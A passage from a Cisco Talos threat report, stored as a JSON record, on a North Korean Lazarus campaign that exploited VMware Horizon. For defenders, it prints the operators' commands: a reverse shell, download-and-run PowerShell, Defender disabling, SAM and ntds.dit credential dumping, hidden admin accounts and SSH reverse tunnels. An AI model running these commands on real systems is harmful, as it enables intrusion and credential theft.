{
    "id": "87c205aa-3698-4c2f-ba9d-60b7c2b9db1f",
    "created_at": "2023-01-12T14:59:11.199053Z",
    "updated_at": "2025-03-27T02:17:23.647376Z",
    "deleted_at": null,
    "sha1_hash": "0e7de0ca11dd14fd9036563facec0b37fd6026b2",
    "title": "2022-09-08 - Lazarus and the tale of three RATs",
    "authors": "",
    "file_creation_date": "2022-10-02T12:01:18Z",
    "file_modification_date": "2022-10-02T12:01:18Z",
    "file_size": 1636135,
    "plain_text": "# Lazarus and the tale of three RATs\n\n**blog.talosintelligence.com/2022/09/lazarus-three-rats.html**\n\nBy [Jung soo An,Asheer Malhotra and](https://twitter.com/Jungsoo_An) [Vitor Ventura.](https://twitter.com/_vventura)\n\n[Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea](https://www.cisa.gov/uscert/northkorea)\nby the United States government.\nThis campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into\ntargeted organizations.\nTargeted organizations include energy providers from around the world, including those headquartered in the\nUnited States, Canada and Japan.\nThe campaign is meant to infiltrate organizations around the world for establishing long term access and\nsubsequently exfiltrating data of interest to the adversary's nation-state.\n[Talos has discovered the use of two known families of malware in these intrusions — VSingle and](https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html) [YamaBot.](https://blogs.jpcert.or.jp/en/2022/07/yamabot.html)\n[Talos has also discovered the use of a recently disclosed implant we're calling \"MagicRAT\" in this campaign.](https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html)\n\n## Introduction\n\nCisco Talos observed North Korean state-sponsored APT Lazarus Group conducting malicious activity between\n[February and July 2022. Lazarus has been previously attributed to the North Korean government by the U.S.](https://www.cisa.gov/uscert/northkorea)\nCybersecurity and Infrastructure Security Agency (CISA). The entry vectors involve the successful exploitation of\nvulnerabilities in VMWare products to establish initial footholds into enterprise networks, followed by the\n[deployment of the group's custom malware implants, VSingle and](https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html) [YamaBot. In addition to these known malware](https://blogs.jpcert.or.jp/en/2022/07/yamabot.html)\nfamilies, we have also discovered the use of a previously unknown malware implant we're calling \"MagicRAT.\"\n\n\n-----\n\n[This campaign was previously partially disclosed by other security](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/stonefly-north-korea-espionage) [firms, but our findings reveal more details about](https://asec.ahnlab.com/ko/34107/)\nthe adversary's modus operandi. We have also observed an overlap of command and control (C2) and payloadhosting infrastructure between our findings and the U.S. Cybersecurity and Infrastructure Security Agency's (CISA)\nJune advisory that detailed continued attempts from threat actors to compromise vulnerable VMWare Horizon\nservers.\n\nIn this research, we illustrate Lazarus Group's post-exploitation tactics, techniques and procedures (TTPs) to\nestablish a foothold, perform initial reconnaissance, deploy bespoke malware and move laterally across infected\nenterprises. We also provide details about the activities performed by the attackers when the VSingle backdoor is\ninstrumented on the infected endpoints.\n\nIn this campaign, Lazarus was primarily targeting energy companies in Canada, the U.S. and Japan. The main goal\nof these attacks was likely to establish long-term access into victim networks to conduct espionage operations in\nsupport of North Korean government objectives. This activity aligns with historical Lazarus intrusions targeting\n[critical infrastructure and energy companies to establish long-term access to siphon off proprietary intellectual](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-sharpshooter-targets-global-defense-critical-infrastructure/)\nproperty.\n\n### Attribution\n\nCisco Talos assesses with high confidence these attacks have been conducted by the North Korean statesponsored threat actor Lazarus Group. During our investigations, we identified three distinct RATs being employed\nby the threat actors, including VSingle and YamaBot, which are exclusively developed and distributed by Lazarus.\n[The Japanese CERT (JPCERT/CC) recently published reports (VSingle,](https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html) [YamaBot), describing them in detail and](https://blogs.jpcert.or.jp/en/2022/07/yamabot.html)\nattributed the campaigns to the Lazarus threat actor.\n\nThe TTPs used in these attacks also point to the Lazarus threat actor. The initial vector was the exploitation of the\n[Log4j vulnerability on exposed VMware Horizon servers. Successful post-exploitation led to the download of their](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)\ntoolkit from web servers. The same initial vector, URL patterns and similar subsequent hands-on-keyboard activity\n[have been described in this report from AhnLab from earlier this year. There are also overlapping IOCs between](https://asec.ahnlab.com/ko/34107/)\n\n\n-----\n\nthe campaign described by AhnLab and the current campaign, such as the IP address 84[.]38.133[.]145, which was\nused as a hosting platform for the actors' malicious tools. Although the same tactics have been applied in both\nattacks, the resulting malware implants deployed have been distinct from one another, indicating the wide variety of\nimplants available at the disposal of Lazarus. Additionally, we've also observed similarities in TTPs disclosed by\n[Kaspersky attributed to the Andariel sub-group under the Lazarus umbrella, with the critical difference being the](https://securelist.com/andariel-deploys-dtrack-and-maui-ransomware/107063/)\ndeployment of distinct malware. While Kaspersky discovered the use of Dtrack and Maui, we've observed the use\nof VSingle, YamaBot and [MagicRAT.](https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html)\n\nCisco Talos acknowledges that when analyzed individually, the attribution evidence only reaches mediumconfidence, however, we're raising our confidence level when analyzing all these points in the context of the\ncampaign and victims.\n\n## Campaign\n\nCisco Talos has observed several attacks targeting multiple victims. In this section, we detail two specific attack\ninstances that we assess have been the most representative of the playbooks employed by Lazarus in this\ncampaign:\n\nVictim 1: Illustrates the kill chain from exploitation to actions on objectives. This intrusion also illustrates the\nuse of the VSingle implant.\nVictim 2: Represents a kill chain similar to Victim 1 but in this instance, we observed the deployment of a new\n[implant we're calling \"MagicRAT\" along with VSingle.](https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html)\n\nA third intrusion set worth noting here is one where we saw the use of a third bespoke implant known as YamaBot.\n[YamaBot was recently disclosed and attributed to the Lazarus APT by the Japan Computer Emergency Response](https://blogs.jpcert.or.jp/en/2022/07/yamabot.html)\n[Team Coordination Center (JPCERT/CC).](https://www.jpcert.or.jp/english/)\n\n\n-----\n\n### Victim No. 1: VSingle and beyond\n\nIn the case of the first victim, we observed the exploitation of publicly known vulnerabilities to ultimately deploy the\nVSingle backdoor on infected endpoints to establish long-term access.\n\n\n-----\n\nIn this specific instance, we also observed the actual instrumentation of VSingle implants to carry out additional\nmalicious activities on the infected systems. The flow below provides an overview of the attacker's playbook, which\nwill be detailed in the sections ahead.\n\n**Exploitation and foothold**\n\n[Cisco Talos identified the exploitation of the Log4Shell vulnerability on VmWare Horizon public-facing servers as](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)\n[the initial attack vector [T1190]. The compromise is followed by a series of activities to establish a foothold [TA0001]](https://attack.mitre.org/versions/v11/techniques/T1190/)\non the systems before the attackers deploy additional malware and move laterally across the network. During our\ninvestigation, we discovered two different foothold payloads. In the first, the attackers abuse node.exe, which is\nshipped with VMware to execute the oneliner node.exe script below.\n\n\n-----\n\n```\n    g pp g y\nrequire('child_process').exec('cmd.exe');var client = new net.Socket();client.connect(<Port>, '<C2_IP>',\nfunction(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\"\n\n```\nThis essentially opens an interactive reverse shell that attackers could use to issue arbitrary commands on the\ninfected entry endpoint.\n\nIn another instance, we observed the attackers exploiting vulnerabilities in VMWare to launch custom PowerShell\nscripts on the infected endpoint via VMWare's ws_ConnectionServer.exe:\n```\npowershell -exec bypass IEX (New-Object\nNet.WebClient).DownloadString('http://<remote_location>/<filename>.ps1')\n\n\n```\nSince VMWare Horizon is executed with administrator privileges, the attacker doesn't have to worry about elevating\ntheir privileges.\n\nAfter the interactive shell is established, the attackers perform a preliminary reconnaissance on the endpoint to get\n[network information and directory listings [T1083], [T1590], [T1518]:](https://attack.mitre.org/techniques/T1083/)\n\nipconfig /all\n\ndir c:\"Program Files (x86)\n\ndir c:\"Program Files\n\n[The next step is the deactivation of the Windows Defender components [T1562]. This is done through registry key](https://attack.mitre.org/techniques/T1562/)\nchanges, WMIC commands and PowerShell commands. The list below contains the full list of methods Cisco Talos\nobserved.\n\npowershell -exec bypass -Command Get-MpPreference\n\npowershell.exe -ExecutionPolicy Bypass -command Set-MpPreference -DisableRealtimeMonitoring $true\n\nreg query HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\n/s /f DisableRealtimeMonitoring\n\nOnce the AV on the system has been bypassed using the reverse shell, the attackers then deploy the actual\nmalware implant from a malware family known to be developed and operated by Lazarus called \"VSingle.\"\n\nThe deployment consists of downloading a copy of the legitimate WinRAR utility from a remote location controlled\n[by the attackers along with an additional payload (archive) [T1608]:](https://attack.mitre.org/techniques/T1608/001/)\n\npowershell -exec bypass -command (New-Object\nSystem.Net.WebClient).DownloadFile('<remote_location>\\\\rar.tmp', '<local_path>\\\\rar.exe')\n\npowershell -exec bypass -command (New-Object\nSystem.Net.WebClient).DownloadFile('<remote_location>\\\\update.tmp <local_path>\\\\java.tmp')\n\n<local_path>\\\\rar.exe e <local_path>\\\\java.tmp <local_path_2> -hp!no!\n\nThe archive downloaded to the infected endpoint is decompressed and consists of the VSingle malware executable\nwhich is optionally renamed and then persisted on the endpoint by creating an auto-start service.\n\n**How is VSingle used?**\n\n\n-----\n\nOur investigations led to the discovery of commands fed to the VSingle backdoor by the attackers to carry out a\nvariety of activities such as reconnaissance, exfiltration and manual backdooring.\n\n[The actor starts by performing additional reconnaissance tasks by running the commands below [T1083], [T1590].](https://attack.mitre.org/techniques/T1083/)\n\n**Command** **Intent**\n\n\nsysteminfo & ipconfig /all & netstat -naop tcp & tasklist & net user & net view\n& arp -a\n\n\nSystem Information Discovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\n\nquery user System Information Discovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\nwhoami System Information Discovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\ndir /a %appdata%\\microsoft System Information Discovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\n\ndir /a\nC:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\microsoft\n\ncmd.exe /u /c dir /a c:\\users\\administrator\n\ncmd /C pwd\n\ncmd /C dir\n\ncmd /C cd c:\\\\Users\\\\<username>\\Download & dir\n\ncmd /C cd c:\\\\Users\\\\<username>\\Downloads & dir\n\ncmd /C cd c:\\\\Users\\\\<username> & dir\n\ncmd /C cd c: & dir\n\ncmd /C tree c:\\\\Users\n\ncmd.exe /u /c time /t\n\ncmd.exe /u /c query session\n\n\nSystem Information Discovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\nSystem Information Discovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\nSystem Information Discovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\n\nThese commands will give the operators a solid understanding of the system they are in, including the installed\nsoftware, network configuration and system users, among other things. This kind of information is crucial to\npreparing for lateral movement activities.\n\nThe attackers also force the system to cache credentials so that it is possible to harvest them afterward\n\n[[T1003/005].](https://attack.mitre.org/techniques/T1003/005/)\n```\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD\n/d 1 /f\n\n\n```\nThe other configuration changes made to the victim host are intended to provide the attackers with their own\n[admin-level users [T1136].](https://attack.mitre.org/techniques/T1136/002/)\n\n**Command** **Intent**\n\ncmd.exe /u /c net user <userid> <password> /add Create user\n\n\ncmd.exe /u /c reg add HKLM\\software\\microsoft\\windows\nnt\\currentversion\\winlogon\\specialaccounts\\userlist /v <username> /t REG_DWORD /d 0 /f\n\ncmd.exe /u /c net localgroup Administrators /add <username>\n\ncmd.exe /u /c net localgroup Remote Desktop Users /add <username>\n\ncmd.exe /u /c net localgroup Administrateur /add <username>\n\ncmd.exe /u /c net localgroup Administrateurs /add <username>\n\n\nAdd privileges\n\nAdd privileges\n\nAdd privileges\n\n\n-----\n\n**Command** **Intent**\n\n\ncmd.exe /u /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n/v AllowMultipleTSSessions /t REG_DWORD /d 1 /f\n\ncmd.exe /u /c reg add\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n/v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\ncmd.exe /u /c reg add HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa /v\nLmCompatibilityLevel /t REG_DWORD /d 0 /f\n\n\nSystem config Allow multiple\nsessions\n\nSystem config disable UAC\n\nSystem config LAN Man\ncompatibility\n\n\nThese could be used if the RAT is detected/removed or even provide the actors with an RDP access, avoiding the\nuse of a malicious tool.\n\nWith VSingle in place, the attackers can access other systems with the help of two additional tools.\n\npvhost.tmp renamed to pvhost.exe, which is actually plink.exe, a utility from Putty that can create SSH\ntunnels between systems.\n[osc.tmp renamed to osc.exe, which we assess with high confidence is 3proxy. Unfortunately, Cisco Talos](https://github.com/3proxy/3proxy)\ncould not obtain a copy of the file.\n\nThese two tools working together create a proxy on the victim system which has its listening port \"exported\" to a\nport on a remote host. This mechanism allows the attacker to have a local proxy port that gives access to the victim\nnetwork as if the attacker's box was on it directly.\n\nFirst, the attackers start the osc.exe (3proxy) to listen on a loopback port (in this example, we chose 8118), with the\ncommand below.\n```\nC:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\microsoft\\osc.exe -i127.0.0.1 -p8118\n\n\n```\nThis alone wouldn't help the attackers, they actually need to have port 8118, exposed on their own network that\n[they can connect to. So, they created an SSH tunnel using Plink, but they forwarded a local port to a remote](https://documentation.help/PuTTY/plink-usage.html)\naddress, in this case, a remote server controlled by the attackers:\n```\nC:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\microsoft\\pvhost.exe -N -R 18118:127.0.0.1:8118 P [Port] -l [username] -pw [password] <Remote_IP>\n\n\n```\nThe option -R forwards the port 8118 on 127.0.0.1 to the remote server on port 18118.\n\n**VSingle RAT Analysis**\n\nThe VSingle loader executable is an MFC-based backdoor that consists of multiple layers. The first is responsible\nfor decoding and executing the next layer (layer 2), a shellcode in the memory of the implant process. The\nshellcode is simply an injector for the next layer (layer 3, also shellcode). The implant spawns a new \"explorer.exe\"\nprocess and injects shellcode (layer 3) into it for execution.\n\nThe layer 3 shellcode is injected into a newly spawned benign process, such as explorer.exe, which consists of\ndecoding another layer (layer 4) of shellcode that is then executed in the benign process.\n\nLayer 4 is the actual VSingle implant DLL loaded reflectively into the memory of the benign process.\n\n\n-----\n\nThe implant is simple in terms of functionalities and is basically a stager that enables the attackers to deploy more\nmalware on the infected system. It also includes the ability to open a reverse shell that connects to the C2 server\nand allows untethered access to the attackers to the endpoint to execute commands via \"cmd.exe.\"\n\nAlthough a rather simple RAT, VSingle can download and execute additional plugins from the C2 server. These\nplugins can either be in the form of shellcode or script files of specific formats served by the C2. The image below\nshows the code used to execute a shellcode downloaded.\n\nIn-memory shellcode execution by the implant.\n\nFor simpler cases, the implant can receive executables or scripts, save them into a file in the %temp% directory\nand execute them on the endpoint. The implant supports the .vbs, .bat and .tmp files, since all of them are\nexecuted through \"cmd /c.\" The .tmp files can also be loaded as executables (.exe).\n\nThe implant can achieve persistence for malware artifacts served and specified by the C2 server. The simpler\nmechanism is the creation of a file in the Startup folders, which is done in two different locations:\n\n\n-----\n\nc:\\Documents and Settings\\%s\\Start Menu\\Programs\\Startup\\%s\n\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\n\nAdditionally, there are three other ways available, all of which use the \"cmd.exe /c\" command, that the VSingle\noperators can use:\n\n**Command** **Intent**\n\n\nsc create \"%s\" DisplayName= \"%s\" type= own type= interact start=\nauto error= ignore binpath= \"cmd.exe /k start \\\"\\\" \\\"%s\\\"\n\nreg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\n/v \"%s\" /t REG_SZ /d \"%s\" /f\n\n\n[Auto start Service Creation [T1543/003]](https://attack.mitre.org/techniques/T1543/003/)\n\n[Run registry key [T1547/001]](https://attack.mitre.org/techniques/T1547/001/)\n\n\nschTasks /Create /F /TN \"%s\" /TR \"%s\" /SC onlogon Scheduled task triggered at logon\n\n[[T1053/005]](https://attack.mitre.org/techniques/T1053/005/)\n\n\nschtasks /create /tn <task_name> /tr C:\\\\Windows\\\\upsvc.exe /sc\nonstart /ru System /rl highest /f\n\n### Victim No. 2: The discovery of MagicRAT\n\n\nScheduled task triggered at system\n[start with high priority [T1053/005]](https://attack.mitre.org/techniques/T1053/005/)\n\n\nIn another victim's network, we saw a similar chain of events: initial recon followed by disabling the AV software and\nthe deployment of a bespoke implant. We also observed successful lateral movement into other endpoints in the\nenterprise.\n\nWhat's unique in this intrusion, however, is that we observed the deployment of a fairly new implant three days\nbefore the attackers deployed VSingle on the infected systems.\n\n[This implant called \"MagicRAT\" is outlined in a recently published post. The reverse interactive shell eventually](https://blog.talosintelligence.com/2022/09/lazarus-magicrat.html)\ndownloads MagicRAT from a remote location.\n\n**MagicRAT Analysis**\n\nIn this campaign, MagicRAT was configured with a different configuration file and path. It also reported to different\nC2 servers. The configuration directory is now called \"MagicMon\" in the current user's \"AppData\\Roaming\"\ndirectory. As seen in the screenshot below, this folder creates and hosts an initialization file named\n\"MagicSystem.ini.\" This INI file contains several configurations including the list of C2 URLs that can be used by\nthe implant to send and receive commands and data.\n\n\n-----\n\nINI file containing the list of base64 encoded C2 URLs.\n\n**Lateral Movement**\n\nDuring the first few days after the successful initial access, the attackers conducted limited reconnaissance of the\nendpoint and deployed two different malware families MagicRAT and VSingle on the infected endpoint to maintain\ncovert access to the system. Just like with the first victim, the attackers then started to perform Active Directory\n(AD) related explorations (via impacket and VSingle) to identify potential endpoints to laterally move into. The table\nbelow illustrates the commands executed to perform such actions.\n\n**Command** **Intent**\n\npowershell.exe Get-NetUser 1> \\\\127.0.0.1\\ADMIN$\\<impacket_log_file> 2>&1 [User Discovery [T1033]](https://attack.mitre.org/techniques/T1033/)\n\npowershell.exe Get-ADDomain 1> \\\\127.0.0.1\\ADMIN$\\<impacket_log_file> 2>&1 Account/Domain\n[Discovery [T1087]](https://attack.mitre.org/techniques/T1087/)\n\n\npowershell.exe Get-ADUser <server> -Properties * 1> \\\\127.0.0.1\\ADMIN$\\\n<impacket_log_file> 2>&1\n\npowershell.exe Get-ADUser -Filter * 1> \\\\127.0.0.1\\ADMIN$\\<impacket_log_file>\n2>&1\n\npowershell.exe Get-ADGroup -filter * 1> \\\\127.0.0.1\\ADMIN$\\<impacket_log_file>\n2>&1\n\npowershell.exe Get-AdComputer -filter * 1> \\\\127.0.0.1\\ADMIN$\\<impacket_log_file>\n2>&1\n\npowershell.exe Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} property * | select name, operatingsystem\n\n\n[User Discovery [T1033]](https://attack.mitre.org/techniques/T1033/)\n\n[User Discovery [T1033]](https://attack.mitre.org/techniques/T1033/)\n\nAccount/Domain\n[Discovery [T1087]](https://attack.mitre.org/techniques/T1087/)\n\nSystem Information\n[Discovery [T1082]](https://attack.mitre.org/techniques/T1082/)\n\nSystem Information\n[Discovery [T1082]](https://attack.mitre.org/techniques/T1082/)\n\n\nnslookup <remote_computername> Account/Domain\n[Discovery [T1087]](https://attack.mitre.org/techniques/T1087/)\n\n\npowershell.exe Get-WMIObject -Class win32_operatingsystem -Computername\n<remote_computername>\n\n\nSystem Information\n[Discovery [T1082]](https://attack.mitre.org/techniques/T1082/)\n\n\npowershell.exe Get-ADUser -Filter * | Select SamAccountName [User Discovery [T1033]](https://attack.mitre.org/techniques/T1033/)\n\npowershell.exe Get-AdUser -Filter * -Properties * | Select Name, logonCount [User Discovery [T1033]](https://attack.mitre.org/techniques/T1033/)\n\n\npowershell.exe Get-AdComputer -Filter * -Properties * | select Name,\nLastLogonDate, lastLogon, IPv4Address\n\n\nAccount/Domain\n[Discovery [T1087]](https://attack.mitre.org/techniques/T1087/)\n\n\n-----\n\nOnce the list of computers and users is obtained, the attackers would manually ping specific endpoints in the list to\nverify if they are reachable (with an occasional tracert). VSingle deployment on new hosts was done by using\nWMIC to start a remote process. This process was, in fact, a PowerShell snippet that would download VSingle from\n[a remote system [T1608/001].](https://attack.mitre.org/techniques/T1608/001/)\n```\nWMIC /node:<Computer_Name> process call create \"powershell.exe (New-Object\nSystem.Net.Webclient).DownloadFile('<remote_location>/svhostw.exe','<local_path>\\\\svhostww.exe')\"\n\n\n```\nIn some infections, we observed the deployment of impacket tools on other endpoints to move laterally and\nestablish an interactive shell.\n\nThis stage of the attacks was clearly manual work performed by a human operator. While trying to establish\ninteractive remote console sessions, we can see the operators making errors on the commands.\n\n**Try #** **Command** **Result**\n\n1 Enter-PSSession <ComputerName> **Failed attempt**\n\n2 Enter-PSSession **Failed attempt**\n\n3 powershell.exe Enter-PSSession **Correct command**\n\nThe attackers typically take their time to explore the infected system by obtaining file listings of multiple directories\nof interest to them. When files of particular interest are found they are put into a .rar archive for exfiltration, typically\nvia one of the custom-developed implants running on the system.\n\n### Victim No. 3: VSingle makes way for YamaBot\n\nDuring one particular intrusion, the attackers first deployed VSingle on the endpoint. However, after the VSingle\nsample was detected, the attackers were at risk of losing access to the enterprise. Therefore, after repeated failed\nattempts to deploy VSingle on the endpoints, the attackers then deployed another updated copy of VSingle. After\nmaintaining continued access for a while, the attackers then moved on to the use of another implant — YamaBot.\n\nYamaBot is a custom-made GoLang-based malware family. It uses HTTP to communicate with its C2 servers. It\ntypically begins by sending preliminary system information about the infected endpoint to the C2: computer name,\nusername and MAC address.\n\n\n-----\n\nYamaBot's helper function names.\n\nThis implant has standard RAT capabilities, including the ability to:\n\nList files and directories.\nSend process information to C2.\nDownload files from remote locations.\nExecute arbitrary commands on the endpoints.\nUninstall itself.\n\n[YamaBot was recently attributed to the Lazarus APT group by JPCERT who provided an excellent analysis of the](https://blogs.jpcert.or.jp/en/2022/07/yamabot.html)\nimplant.\n\n### Credential Harvesting\n\nApart from the usual recon and deployment of the custom implants, we also observed Lazarus' use of completely\ndifferent TTPs for credential harvesting. The attackers created backups of volumes that were then used to create a\ncopy of the \"ntds.dit\" file for exfiltration containing Active Directory data.\n\n**Command** **Intent**\n\n\n-----\n\n**Command** **Intent**\n\n\nvssadmin list shadows /for=C: ^> <local_path>\\<log_file> > <local_path>\\execute.bat &\nC:\\Windows\\system32\\cmd.exe /Q /c <local_path>\\execute.bat & del <local_path>\\execute.bat\n\nvssadmin create shadow /For=C: ^> <local_path>\\<log_file> > <local_path>\\execute.bat &\nC:\\Windows\\system32\\cmd.exe /Q /c <local_path>\\execute.bat & del <local_path>\\execute.bat\n\ncmd.exe /C copy \\\\?\n\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit\n<local_path>\\phPzFvOU.tmp ^> <local_path>\\<log_file> > <local_path>\\execute.bat &\nC:\\Windows\\system32\\cmd.exe /Q /c <local_path>\\execute.bat & del <local_path>\\execute.bat\n\n## The Variations in the playbook\n\n\nSystem\nInformation\nDiscovery\n\n[[T1082]](https://attack.mitre.org/techniques/T1082/)\n\nOS\nCredential\nDumping:\nNTDS\n\n[[T1003/003]](https://attack.mitre.org/techniques/T1003/003/)\n\nOS\nCredential\nDumping:\nNTDS\n\n[[T1003/003]](https://attack.mitre.org/techniques/T1003/003/)\n\n\nThe overall structure of the infection chains remained the same across multiple intrusions in this campaign,\nprimarily consisting of the cyber kill chain that we illustrated at the beginning of the campaign section.\n\nHowever, there were some key variations that consist of some optional activities conducted by the adversary in\ndifferent intrusion sets. These variations include the use of:\n\nCredential harvesting using tools such as Mimikatz and Procdump.\nProxy tools to set up SOCKs proxies.\nReverse tunneling tools such as PuTTY's plink.\n\nIt is therefore necessary to list all the TTPs used by the adversary across all the intrusions we've discovered in this\ncampaign. This section provides an additional list of TTPs and commands used by the operators along with their\ncorresponding MITRE ATT&CK IDs to help defenders better understand this APT's offensive playbook.\n\n**_Note: There is some overlap between operations (common or similar commands) carried out via the reverse shell,_**\n_the VSingle RAT and impacket tools. This could be because there might be multiple human operators manually_\n_executing their own set of commands based on their shift days and timings (without proper handover of information_\n_collected and percolated from one operator to another)._\n\nFor example, in one instance, the attackers tried to obtain Active Directory information on one endpoint via\nPowerShell cmdlets. However, a day later, the attackers used adfind.exe to extract similar information on the same\nendpoint.\n\n### Disabling AV components\n\nThe threat actors used multiple variations of commands to query information about the installed antivirus software\non the endpoints, followed by disabling the Windows Defender antivirus.\n\n**Command** **Intent**\n\n\ncmd /C wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct\nGet displayname\n\n\nSecurity Software\nDiscovery\n\n[[T1518/001]](https://attack.mitre.org/techniques/T1518/001/)\n\n\n-----\n\n**Command** **Intent**\n\nwmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get /format:list Security Software\nDiscovery\n\n[[T1518/001]](https://attack.mitre.org/techniques/T1518/001/)\n\n\ncmd.exe /Q /c wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET\ndisplayName, productState, pathToSignedProductExe 1> \\\\127.0.0.1\\ADMIN$\\\n<log_file_name> 2>&1\n\n\nSecurity Software\nDiscovery\n\n[[T1518/001]](https://attack.mitre.org/techniques/T1518/001/)\n\n\ncmd.exe /c powershell -exec bypass -Command Get-MpPreference Security Software\nDiscovery\n\n[[T1518/001]](https://attack.mitre.org/techniques/T1518/001/)\n\n\npowershell.exe -ExecutionPolicy Bypass -command Set-MpPreference DisableRealtimeMonitoring $true\n\nreg query HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\nDefender\\\\Real-Time Protection /s /f DisableRealtimeMonitoring\n\npowershell -exec bypass -Command Set-MpPreference -SubmitSamplesConsent\nNeverSendpowershell -exec bypass -Command Set-MpPreference -MAPSReporting\nDisable\n\ncmd.exe /c reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v\nDisableAntiSpyWare /t REG_DWORD /d 1\n\n### Reconnaissance\n\n\nImpair Defenses\n\n[[T1562/001]](https://attack.mitre.org/techniques/T1562/001/)\n\nImpair Defenses\n\n[[T1562/001]](https://attack.mitre.org/techniques/T1562/001/)\n\nImpair Defenses\n\n[[T1562/001]](https://attack.mitre.org/techniques/T1562/001/)\n\nImpair Defenses\n\n[[T1562/001]](https://attack.mitre.org/techniques/T1562/001/)\n\n\nDuring the reconnaissance and credential harvesting stage, the attackers gather information about the system, the\nnetwork — including the domain — and the installed software. Using a WMIC command, the attackers also collect\ninformation about the logical drives of the infected systems.\n\nThen, the attackers harvest and exfiltrate credentials. During the reconnaissance stage, the attackers specifically\ncheck if the RDP port is open. If it is and the attackers decrypt any of the harvested credentials, they would have\ndirect access to the system without the need to install any other backdoor. The complete list of commands is\nprovided in the table below.\n\n**Command** **Intent**\n\ncmd.exe /c ipconfig /all Network discovery\n\n[[T1590]](https://attack.mitre.org/techniques/T1590/)\n\ncmd.exe /c dir c:\"Program Files (x86) [Installed software [T1518]](https://attack.mitre.org/techniques/T1518/)\n\ncmd.exe /c dir c:\"Program Files [Installed software [T1518]](https://attack.mitre.org/techniques/T1518/)\n\ncmd.exe /c systeminfo System Information\n[Discovery [T1082]](https://attack.mitre.org/techniques/T1082/)\n\ncmd /C qwinsta [User Discovery [T1033]](https://attack.mitre.org/techniques/T1033/)\n\ncmd /C nslookup Network discovery\n\n[[T1590]](https://attack.mitre.org/techniques/T1590/)\n\ncmd /C netstat -noa | findstr 3389 Network discovery\n\n[[T1590]](https://attack.mitre.org/techniques/T1590/)\n\n\n-----\n\n**Command** **Intent**\n\ncmd /C net view /domain Domain discovery\n\n[[T1087/002]](https://attack.mitre.org/techniques/T1087/002/)\n\ncmd /C wmic logicaldisk get deviceid, size System Information\n[Discovery [T1082]](https://attack.mitre.org/techniques/T1082/)\n\n\ncmd.exe /c reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nServer\\WinStations\\RDP-Tcp\n\ncmd.exe /Q /c wevtutil qe Microsoft-Windows-TerminalServicesLocalSessionManager/Operational /c:20 /q:*[System [(EventID=25)]] /rd:true /f:text\n1> \\\\127.0.0.1\\ADMIN$\\<impacket_log_file> 2>&1\n\nnetsh advfirewall firewall add rule name=allow RemoteDesktop dir=in protocol=TCP\nlocalport=3389 action=allow\n\nreg.exe add\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nServer\\WinStations\\RDP-Tcp /v PortNumber /t REG_DWORD /d 3389 /f\n\n### Credential harvesting\n\n\nSystem Information\n[Discovery [T1082]](https://attack.mitre.org/techniques/T1082/)\n\nQuery event logs - Get\nRDP session\nreconnection information\n\nModify Firewall\n\n[[T1562/004]](https://attack.mitre.org/techniques/T1562/004/)\n\nConfigure RDP\n\n[[T1021/001]](https://attack.mitre.org/techniques/T1021/001/)\n\n\nIn some intrusions, the attackers saved copies of registry hives for subsequent exfiltration for obtaining credentials\nand policy information.\n\n**Command** **Intent**\n\ncmd.exe /c reg save hklm\\sam <local_path>\\zsam.tmp Credential harvesting\n\n[[T1003]](https://attack.mitre.org/techniques/T1003/)\n\ncmd.exe /c reg save hklm\\security <local_path>\\zsec.tmp Credential harvesting\n\n[[T1003]](https://attack.mitre.org/techniques/T1003/)\n\ncmd.exe /c reg save hklm\\system <local_path>\\zsys.tmp Credential harvesting\n\n[[T1003]](https://attack.mitre.org/techniques/T1003/)\n\n<local_path>\\rar.exe a <local_path>\\zzzzz.tmp <local_path>\\zs*.tmp Archive Collected\n[Data [T1560]](https://attack.mitre.org/techniques/T1560/)\n\n\ncmd.exe /c copy /y <local_path>\\zzzzz.tmp c:\"Program 